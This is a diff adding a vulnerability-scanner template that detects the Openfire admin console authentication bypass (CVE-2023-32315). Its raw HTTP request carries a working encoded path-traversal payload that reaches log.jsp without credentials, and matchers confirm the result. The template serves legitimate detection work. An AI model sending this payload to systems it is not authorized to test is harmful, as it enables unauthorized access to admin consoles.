@@ -1,0 +1,28 @@
+id: openfire-admin-console-auth-bypass
+info:
+  name: Openfire Admin Console Authentication Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: cve-2023-32315,auth-bypass
+  description: |
+    Detects authentication bypass vulnerability in Openfire admin console.
+http:
+  - raw:
+      - |
+        GET /setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "class=\\\"head-num\\\""
+      - type: word
+        part: body
+        words:
+          - "openfire.log"
+          - "error"
